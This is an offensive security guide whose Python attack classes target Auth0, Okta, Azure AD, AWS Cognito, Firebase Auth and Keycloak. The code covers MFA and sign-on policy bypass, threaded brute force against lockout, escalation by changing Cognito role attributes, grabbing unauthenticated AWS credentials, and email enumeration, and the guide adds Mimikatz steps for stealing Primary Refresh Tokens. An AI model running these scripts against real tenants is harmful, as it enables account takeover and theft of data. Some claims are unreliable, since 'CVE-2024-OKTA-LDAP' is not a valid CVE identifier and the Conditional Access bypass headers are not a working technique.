# Identity Provider Attacks

## Overview

Identity providers (IdPs) are centralized authentication services that, when compromised or misconfigured, grant access to all downstream applications. This document covers attack techniques for Auth0, Okta, Azure AD/Entra ID, AWS Cognito, Firebase Auth, and Keycloak, with focus on 2024-2025 CVEs and misconfigurations.

**Key Sources**:
- https://trust.okta.com/security-advisories/okta-classic-application-sign-on-policy-bypass-2024/
- https://medium.com/@melodicbook/exploiting-security-misconfiguration-in-auth0-by-okta-061da9330320
- https://medium.com/@melodicbook/exploiting-security-misconfigurations-in-aws-cognito-authflow-types-bc693260b8b8
- https://www.commandlink.com/cve-2024-8698-keycloak-vulnerability-exposes-saml-authentication-to-bypass-and-privilege-escalation/
- https://expel.com/blog/attackers-are-expanding-access-through-aws-cognito/

---

## 1. Auth0 Misconfigurations

### 1.1 Common Auth0 Security Issues

```python
#!/usr/bin/env python3
"""Auth0 Misconfiguration Scanner"""

import requests
import json

class Auth0Scanner:
    """Scan for common Auth0 misconfigurations."""

    def __init__(self, auth0_domain):
        self.domain = auth0_domain  # e.g., 'tenant.auth0.com'
        self.base_url = f"https://{auth0_domain}"

    def enumerate_configuration(self):
        """Retrieve and analyze Auth0 tenant configuration."""
        endpoints = {
            'oidc_config': f"{self.base_url}/.well-known/openid-configuration",
            'jwks': f"{self.base_url}/.well-known/jwks.json",
            'saml_metadata': f"{self.base_url}/samlp/metadata",
        }

        config = {}
        for name, url in endpoints.items():
            try:
                resp = requests.get(url)
                if resp.status_code == 200:
                    config[name] = resp.json() if 'json' in resp.headers.get('content-type', '') else resp.text
            except:
                pass

        return config

    def test_social_connection_abuse(self, client_id):
        """Test if social connections allow unauthorized account creation."""
        # Check which social providers are enabled
        resp = requests.get(
            f"{self.base_url}/authorize",
            params={
                'client_id': client_id,
                'response_type': 'code',
                'redirect_uri': 'https://target.com/callback',
                'scope': 'openid profile email',
                'connection': 'google-oauth2',  # Test each provider
            },
            allow_redirects=False
        )

        connections_to_test = [
            'google-oauth2', 'facebook', 'github', 'twitter',
            'linkedin', 'microsoft', 'apple', 'amazon',
            'Username-Password-Authentication', 'sms', 'email',
        ]

        results = []
        for connection in connections_to_test:
            resp = requests.get(
                f"{self.base_url}/authorize",
                params={
                    'client_id': client_id,
                    'response_type': 'code',
                    'redirect_uri': 'https://target.com/callback',
                    'connection': connection,
                },
                allow_redirects=False
            )
            results.append({
                'connection': connection,
                'enabled': resp.status_code == 302,
                'redirect': resp.headers.get('Location', '')[:100]
            })

        return results

    def test_management_api_exposure(self):
        """Test if Auth0 Management API is accessible."""
        mgmt_endpoints = [
            '/api/v2/users',
            '/api/v2/clients',
            '/api/v2/connections',
            '/api/v2/tenants/settings',
            '/api/v2/logs',
            '/api/v2/rules',
        ]

        results = []
        for endpoint in mgmt_endpoints:
            resp = requests.get(f"{self.base_url}{endpoint}")
            results.append({
                'endpoint': endpoint,
                'status': resp.status_code,
                'exposed': resp.status_code not in [401, 403],
            })

        return results

    def test_callback_url_validation(self, client_id):
        """Test redirect_uri validation strictness."""
        evil_uris = [
            'https://attacker.com/callback',
            'https://target.com.attacker.com/callback',
            'https://target.com@attacker.com/callback',
            'javascript:alert(1)',
            'data:text/html,test',
            'https://target.com/callback/../../../evil',
        ]

        results = []
        for uri in evil_uris:
            resp = requests.get(
                f"{self.base_url}/authorize",
                params={
                    'client_id': client_id,
                    'response_type': 'code',
                    'redirect_uri': uri,
                },
                allow_redirects=False
            )
            results.append({
                'redirect_uri': uri,
                'accepted': resp.status_code == 302,
                'error': 'error' in resp.headers.get('Location', '')
            })

        return results

    def test_token_endpoint_misconfig(self, client_id, client_secret=None):
        """Test Auth0 token endpoint for misconfigurations."""
        # Test password grant (should be disabled for most apps)
        resp = requests.post(
            f"{self.base_url}/oauth/token",
            json={
                'grant_type': 'password',
                'client_id': client_id,
                'client_secret': client_secret or '',
                'username': 'test@test.com',
                'password': 'test',
                'audience': f"{self.base_url}/api/v2/",
            }
        )

        results = [{
            'grant_type': 'password',
            'supported': resp.status_code != 403,
            'note': 'Password grant should be disabled for web apps'
        }]

        # Test client credentials grant
        resp = requests.post(
            f"{self.base_url}/oauth/token",
            json={
                'grant_type': 'client_credentials',
                'client_id': client_id,
                'client_secret': client_secret or '',
                'audience': f"{self.base_url}/api/v2/",
            }
        )
        results.append({
            'grant_type': 'client_credentials',
            'supported': resp.status_code == 200,
            'note': 'Check if Management API audience is accessible'
        })

        return results
```

---

## 2. Okta Bypass Techniques

### 2.1 Okta Classic Sign-On Policy Bypass (2024)

**Vulnerability**: In September 2024, Okta disclosed that attackers with valid credentials could bypass application-specific sign-on policies by modifying their user-agent string.

**Source**: https://trust.okta.com/security-advisories/okta-classic-application-sign-on-policy-bypass-2024/

```python
class OktaBypass:
    """Exploit Okta authentication bypass techniques."""

    def test_user_agent_policy_bypass(self, okta_domain, username, password):
        """Test Okta Classic sign-on policy bypass via User-Agent manipulation."""
        user_agents = [
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
            'OktaMobile/6.0.0',
            'Mozilla/5.0 (Linux; Android 14)',
            '',  # Empty user agent
            'curl/7.88.1',
            'python-requests/2.28.0',
        ]

        results = []
        for ua in user_agents:
            resp = requests.post(
                f"https://{okta_domain}/api/v1/authn",
                json={'username': username, 'password': password},
                headers={'User-Agent': ua}
            )
            results.append({
                'user_agent': ua[:50],
                'status': resp.status_code,
                'mfa_required': 'MFA_REQUIRED' in resp.text,
                'success': resp.json().get('status') == 'SUCCESS' if resp.ok else False,
                'bypassed_mfa': resp.json().get('status') == 'SUCCESS' and not resp.json().get('_embedded', {}).get('factors'),
            })

        return results

    def test_ad_ldap_auth_bypass(self, okta_domain, username):
        """Test the October 2024 AD/LDAP delegated auth bypass."""
        # Vulnerability: Usernames >= 52 characters with cached credentials
        # could bypass authentication
        long_username = username + 'A' * (52 - len(username))

        resp = requests.post(
            f"https://{okta_domain}/api/v1/authn",
            json={'username': long_username, 'password': 'anything'}
        )

        return {
            'long_username_used': long_username,
            'status': resp.status_code,
            'result': resp.json().get('status', 'unknown'),
            'vulnerability': 'CVE-2024-OKTA-LDAP - long username cache bypass'
        }

    def test_session_token_reuse(self, okta_domain, session_token):
        """Test if Okta session tokens can be reused across applications."""
        # Create session from token
        resp = requests.post(
            f"https://{okta_domain}/api/v1/sessions",
            json={'sessionToken': session_token}
        )

        if resp.ok:
            session_id = resp.json().get('id')
            # Test session against different apps
            apps = requests.get(
                f"https://{okta_domain}/api/v1/apps",
                cookies={'sid': session_id}
            )
            return {
                'session_created': True,
                'session_id': session_id,
                'apps_accessible': apps.status_code == 200
            }

        return {'session_created': False}
```

---

## 3. Azure AD / Entra ID Attacks

### 3.1 Azure AD Exploitation Techniques

```python
class AzureADAttacker:
    """Attack techniques for Azure AD / Entra ID."""

    def __init__(self, tenant_id):
        self.tenant_id = tenant_id
        self.base_url = f"https://login.microsoftonline.com/{tenant_id}"

    def enumerate_tenant(self):
        """Enumerate Azure AD tenant information."""
        info = {}

        # OpenID configuration
        resp = requests.get(f"{self.base_url}/.well-known/openid-configuration")
        if resp.ok:
            info['oidc_config'] = resp.json()

        # Tenant info via well-known endpoint
        resp = requests.get(
            f"https://login.microsoftonline.com/{self.tenant_id}/v2.0/.well-known/openid-configuration"
        )
        if resp.ok:
            info['v2_config'] = resp.json()

        return info

    def test_guest_user_abuse(self, access_token):
        """Test if guest users have excessive permissions."""
        graph_endpoints = [
            '/me',
            '/users',
            '/groups',
            '/organization',
            '/applications',
            '/servicePrincipals',
            '/directoryRoles',
            '/domains',
        ]

        results = []
        for endpoint in graph_endpoints:
            resp = requests.get(
                f"https://graph.microsoft.com/v1.0{endpoint}",
                headers={'Authorization': f'Bearer {access_token}'}
            )
            results.append({
                'endpoint': endpoint,
                'status': resp.status_code,
                'accessible': resp.status_code == 200,
            })

        return results

    def test_prt_exploitation(self):
        """Document PRT (Primary Refresh Token) exploitation techniques."""
        return {
            'attack_name': 'PRT Token Theft',
            'description': 'Primary Refresh Token provides SSO across all Azure AD resources',
            'tools': ['ROADtools', 'AADInternals', 'Mimikatz'],
            'steps': [
                '1. Extract PRT from compromised device:',
                '   mimikatz # token::elevate',
                '   mimikatz # dpapi::cloudapkd /user:victim',
                '   OR: roadrecon auth --prt-cookie <cookie>',
                '',
                '2. Use PRT to access all Azure AD resources:',
                '   roadrecon gather --access-token <token>',
                '',
                '3. Enumerate all applications and permissions:',
                '   roadrecon gui',
                '',
                '4. Access specific applications:',
                '   Use PRT to get tokens for any Azure AD application',
            ],
            'impact': 'Complete access to all Azure AD integrated applications',
            'severity': 'CRITICAL'
        }

    def test_conditional_access_bypass(self, access_token):
        """Test Conditional Access policy bypass techniques."""
        bypass_techniques = [
            {
                'name': 'Device compliance bypass',
                'headers': {'X-MS-DeviceId': 'compliant-device-id'},
            },
            {
                'name': 'Legacy auth protocol',
                'headers': {'client-request-id': 'legacy-app'},
            },
            {
                'name': 'B2B guest bypass',
                'headers': {'Authorization': f'Bearer {access_token}'},
            },
        ]

        results = []
        for technique in bypass_techniques:
            resp = requests.get(
                'https://graph.microsoft.com/v1.0/me',
                headers=technique['headers']
            )
            results.append({
                'technique': technique['name'],
                'status': resp.status_code,
                'bypassed': resp.status_code == 200
            })

        return results
```

---

## 4. AWS Cognito Exploitation

### 4.1 Cognito Misconfigurations

**Source**: https://medium.com/@melodicbook/exploiting-security-misconfigurations-in-aws-cognito-authflow-types-bc693260b8b8

```python
class CognitoExploiter:
    """Exploit AWS Cognito misconfigurations."""

    def __init__(self, region, user_pool_id, client_id):
        self.region = region
        self.user_pool_id = user_pool_id
        self.client_id = client_id
        self.endpoint = f"https://cognito-idp.{region}.amazonaws.com"

    def test_self_signup(self):
        """Test if self-signup is enabled (should be restricted)."""
        import boto3
        client = boto3.client('cognito-idp', region_name=self.region)

        try:
            resp = client.sign_up(
                ClientId=self.client_id,
                Username='attacker@evil.com',
                Password='AttackerP@ss1!',
                UserAttributes=[
                    {'Name': 'email', 'Value': 'attacker@evil.com'},
                ]
            )
            return {
                'self_signup_enabled': True,
                'user_confirmed': resp.get('UserConfirmed', False),
                'vulnerability': 'Unintended self-signup allows unauthorized account creation',
                'severity': 'HIGH'
            }
        except client.exceptions.NotAuthorizedException:
            return {'self_signup_enabled': False}
        except Exception as e:
            return {'error': str(e)}

    def test_attribute_manipulation(self, access_token):
        """Test if users can modify their own sensitive attributes."""
        import boto3
        client = boto3.client('cognito-idp', region_name=self.region)

        sensitive_attributes = [
            {'Name': 'custom:role', 'Value': 'admin'},
            {'Name': 'custom:permissions', 'Value': 'admin:full'},
            {'Name': 'email_verified', 'Value': 'true'},
            {'Name': 'phone_number_verified', 'Value': 'true'},
            {'Name': 'custom:tenant_id', 'Value': 'admin-tenant'},
            {'Name': 'custom:is_admin', 'Value': 'true'},
        ]

        results = []
        for attr in sensitive_attributes:
            try:
                client.update_user_attributes(
                    UserAttributes=[attr],
                    AccessToken=access_token
                )
                results.append({
                    'attribute': attr['Name'],
                    'modifiable': True,
                    'severity': 'CRITICAL'
                })
            except Exception as e:
                results.append({
                    'attribute': attr['Name'],
                    'modifiable': False,
                    'error': str(e)[:100]
                })

        return results

    def test_identity_pool_auth(self, identity_pool_id):
        """Test if Cognito Identity Pool allows unauthenticated access."""
        import boto3
        client = boto3.client('cognito-identity', region_name=self.region)

        try:
            resp = client.get_id(
                IdentityPoolId=identity_pool_id
            )
            identity_id = resp['IdentityId']

            # Get credentials for unauthenticated identity
            creds = client.get_credentials_for_identity(
                IdentityId=identity_id
            )

            return {
                'unauth_access': True,
                'identity_id': identity_id,
                'credentials': {
                    'access_key': creds['Credentials']['AccessKeyId'],
                    'expiration': str(creds['Credentials']['Expiration']),
                },
                'severity': 'HIGH',
                'next_steps': [
                    'Enumerate IAM permissions with these credentials',
                    'Check for S3, DynamoDB, Lambda access',
                    'Look for privilege escalation paths',
                ]
            }
        except Exception as e:
            return {'unauth_access': False, 'error': str(e)}

    def test_custom_auth_flow(self):
        """Test custom authentication flow for bypass opportunities."""
        import boto3
        client = boto3.client('cognito-idp', region_name=self.region)

        auth_flows = [
            'USER_PASSWORD_AUTH',
            'USER_SRP_AUTH',
            'CUSTOM_AUTH',
            'ADMIN_NO_SRP_AUTH',
            'ADMIN_USER_PASSWORD_AUTH',
        ]

        results = []
        for flow in auth_flows:
            try:
                resp = client.initiate_auth(
                    AuthFlow=flow,
                    ClientId=self.client_id,
                    AuthParameters={
                        'USERNAME': 'test',
                        'PASSWORD': 'test',
                    }
                )
                results.append({
                    'auth_flow': flow,
                    'supported': True,
                    'challenge': resp.get('ChallengeName'),
                })
            except client.exceptions.NotAuthorizedException:
                results.append({'auth_flow': flow, 'supported': True, 'note': 'Valid flow, bad creds'})
            except client.exceptions.InvalidParameterException as e:
                results.append({'auth_flow': flow, 'supported': False, 'error': str(e)[:100]})
            except Exception as e:
                results.append({'auth_flow': flow, 'error': str(e)[:100]})

        return results
```

---

## 5. Firebase Auth Flaws

### 5.1 Firebase Authentication Exploitation

```python
class FirebaseAuthExploiter:
    """Exploit Firebase Authentication misconfigurations."""

    def __init__(self, api_key, project_id):
        self.api_key = api_key
        self.project_id = project_id
        self.auth_url = 'https://identitytoolkit.googleapis.com/v1'

    def test_anonymous_auth(self):
        """Test if anonymous authentication is enabled."""
        resp = requests.post(
            f"{self.auth_url}/accounts:signUp?key={self.api_key}",
            json={'returnSecureToken': True}
        )

        if resp.ok:
            data = resp.json()
            return {
                'anonymous_auth_enabled': True,
                'id_token': data.get('idToken'),
                'local_id': data.get('localId'),
                'severity': 'MEDIUM',
                'next': 'Test Firestore/RTDB access with this token'
            }

        return {'anonymous_auth_enabled': False}

    def test_email_enumeration(self, emails):
        """Enumerate valid email addresses via Firebase Auth."""
        results = []
        for email in emails:
            resp = requests.post(
                f"{self.auth_url}/accounts:createAuthUri?key={self.api_key}",
                json={'identifier': email, 'continueUri': 'https://example.com'}
            )

            if resp.ok:
                data = resp.json()
                results.append({
                    'email': email,
                    'registered': data.get('registered', False),
                    'signin_methods': data.get('signinMethods', []),
                    'providers': data.get('allProviders', [])
                })

        return results

    def test_custom_token_abuse(self, id_token):
        """Test if Firebase custom token claims can be escalated."""
        # Exchange ID token for custom claims info
        resp = requests.post(
            f"{self.auth_url}/accounts:lookup?key={self.api_key}",
            json={'idToken': id_token}
        )

        if resp.ok:
            users = resp.json().get('users', [{}])
            user = users[0] if users else {}
            return {
                'custom_claims': user.get('customAttributes', '{}'),
                'email_verified': user.get('emailVerified', False),
                'providers': [p.get('providerId') for p in user.get('providerUserInfo', [])],
                'created_at': user.get('createdAt'),
            }

        return {'error': 'Could not fetch user info'}

    def test_password_reset_abuse(self, email):
        """Test Firebase password reset for abuse."""
        # Send password reset
        resp = requests.post(
            f"{self.auth_url}/accounts:sendOobCode?key={self.api_key}",
            json={'requestType': 'PASSWORD_RESET', 'email': email}
        )

        return {
            'reset_sent': resp.ok,
            'email': resp.json().get('email') if resp.ok else None,
            'note': 'Check if reset email reveals account existence'
        }

    def test_security_rules_bypass(self, id_token):
        """Test Firestore/RTDB security rules with authenticated token."""
        # Test Firestore
        firestore_url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents"
        collections = ['users', 'admin', 'config', 'secrets', 'private', 'internal']

        results = []
        for collection in collections:
            resp = requests.get(
                f"{firestore_url}/{collection}",
                headers={'Authorization': f'Bearer {id_token}'}
            )
            results.append({
                'collection': collection,
                'accessible': resp.status_code == 200,
                'document_count': len(resp.json().get('documents', [])) if resp.ok else 0
            })

        # Test RTDB
        rtdb_url = f"https://{self.project_id}-default-rtdb.firebaseio.com"
        rtdb_resp = requests.get(f"{rtdb_url}/.json?auth={id_token}")
        results.append({
            'rtdb_root_access': rtdb_resp.status_code == 200,
            'data_size': len(rtdb_resp.text) if rtdb_resp.ok else 0
        })

        return results
```

---

## 6. Keycloak Vulnerabilities

### 6.1 Keycloak CVEs (2024-2025)

| CVE | Description | Severity |
|-----|-------------|----------|
| CVE-2024-3656 | Broken access control - low priv users can admin functions | High |
| CVE-2024-8698 | SAML signature position confusion | High |
| CVE-2024-7318 | Brute force bypass via timing | Medium |
| CVE-2024-4629 | Login attempt counter race condition | Medium |

**Source**: https://www.commandlink.com/cve-2024-8698-keycloak-vulnerability-exposes-saml-authentication-to-bypass-and-privilege-escalation/

```python
class KeycloakExploiter:
    """Exploit Keycloak vulnerabilities and misconfigurations."""

    def __init__(self, keycloak_url, realm='master'):
        self.base_url = keycloak_url
        self.realm = realm

    def test_admin_api_access(self, access_token):
        """Test CVE-2024-3656: Low privilege users accessing admin functions."""
        admin_endpoints = [
            f'/admin/realms/{self.realm}/users',
            f'/admin/realms/{self.realm}/clients',
            f'/admin/realms/{self.realm}/groups',
            f'/admin/realms/{self.realm}/roles',
            f'/admin/realms/{self.realm}/events',
            f'/admin/realms/{self.realm}/identity-provider/instances',
            '/admin/realms',
        ]

        results = []
        for endpoint in admin_endpoints:
            resp = requests.get(
                f"{self.base_url}{endpoint}",
                headers={'Authorization': f'Bearer {access_token}'}
            )
            results.append({
                'endpoint': endpoint,
                'status': resp.status_code,
                'accessible': resp.status_code == 200,
                'cve': 'CVE-2024-3656'
            })

        return results

    def test_brute_force_bypass(self, username, password_list):
        """Test CVE-2024-4629: Brute force protection bypass via race condition."""
        import threading

        results = []
        barrier = threading.Barrier(len(password_list))

        def try_login(password):
            barrier.wait()
            resp = requests.post(
                f"{self.base_url}/realms/{self.realm}/protocol/openid-connect/token",
                data={
                    'grant_type': 'password',
                    'client_id': 'account',
                    'username': username,
                    'password': password,
                }
            )
            results.append({
                'password': password[:3] + '***',
                'status': resp.status_code,
                'success': resp.status_code == 200,
                'locked': resp.status_code == 429
            })

        threads = [threading.Thread(target=try_login, args=(pw,)) for pw in password_list]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        locked_count = sum(1 for r in results if r['locked'])
        return {
            'total_attempts': len(results),
            'locked_attempts': locked_count,
            'race_condition_exploitable': locked_count == 0,
            'results': results
        }

    def test_saml_signature_bypass(self):
        """Test CVE-2024-8698: SAML signature position confusion."""
        return {
            'cve': 'CVE-2024-8698',
            'description': (
                'Keycloak XMLSignatureUtil determines signature scope based on '
                'position rather than explicit Reference elements. Attacker can '
                'craft SAML response with signed and unsigned assertions where '
                'Keycloak validates the signed one but processes the unsigned one.'
            ),
            'affected_versions': 'Keycloak < 25.0.6',
            'testing_steps': [
                '1. Capture legitimate SAML response from Keycloak IdP',
                '2. Add unsigned evil assertion before signed assertion',
                '3. Ensure signed assertion has valid signature',
                '4. Submit to SP (Keycloak verifies position-based, not reference-based)',
                '5. SP processes the unsigned evil assertion',
            ],
            'impact': 'Authentication bypass and privilege escalation',
        }

    def enumerate_realm_info(self):
        """Enumerate Keycloak realm configuration."""
        info = {}

        # Realm info
        resp = requests.get(f"{self.base_url}/realms/{self.realm}")
        if resp.ok:
            info['realm'] = resp.json()

        # OIDC config
        resp = requests.get(
            f"{self.base_url}/realms/{self.realm}/.well-known/openid-configuration"
        )
        if resp.ok:
            info['oidc'] = resp.json()

        # Account console
        resp = requests.get(f"{self.base_url}/realms/{self.realm}/account")
        info['account_console'] = resp.status_code == 200

        return info
```

---

## 7. Testing Checklist

```
# Auth0
[ ] Enumerate social connections
[ ] Test Management API exposure
[ ] Test callback URL validation
[ ] Test password grant availability
[ ] Test client credentials scope

# Okta
[ ] Test User-Agent policy bypass
[ ] Test long username cache bypass
[ ] Test session token reuse across apps
[ ] Test MFA enforcement gaps

# Azure AD / Entra ID
[ ] Enumerate tenant configuration
[ ] Test guest user permissions
[ ] Test PRT exploitation
[ ] Test Conditional Access bypass
[ ] Test legacy auth protocols

# AWS Cognito
[ ] Test self-signup configuration
[ ] Test attribute manipulation
[ ] Test identity pool unauth access
[ ] Test custom auth flow support
[ ] Test user pool enumeration

# Firebase Auth
[ ] Test anonymous authentication
[ ] Test email enumeration
[ ] Test security rules with auth token
[ ] Test custom token claims

# Keycloak
[ ] Test admin API access (CVE-2024-3656)
[ ] Test brute force bypass (CVE-2024-4629)
[ ] Test SAML signature bypass (CVE-2024-8698)
[ ] Enumerate realm configuration
```

---

## References

- Okta Policy Bypass: https://trust.okta.com/security-advisories/okta-classic-application-sign-on-policy-bypass-2024/
- Auth0 Misconfigurations: https://medium.com/@melodicbook/exploiting-security-misconfiguration-in-auth0-by-okta-061da9330320
- AWS Cognito Exploitation: https://medium.com/@melodicbook/exploiting-security-misconfigurations-in-aws-cognito-authflow-types-bc693260b8b8
- Cognito in Attacks: https://expel.com/blog/attackers-are-expanding-access-through-aws-cognito/
- Keycloak CVE-2024-8698: https://www.commandlink.com/cve-2024-8698-keycloak-vulnerability-exposes-saml-authentication-to-bypass-and-privilege-escalation/
- Keycloak CVE-2024-3656: https://github.com/h4x0r-dz/CVE-2024-3656
- Hacking AWS Cognito: https://hackingthe.cloud/aws/exploitation/cognito_user_self_signup/
- ROADtools: https://github.com/dirkjanm/ROADtools
- AADInternals: https://github.com/Gerenios/AADInternals
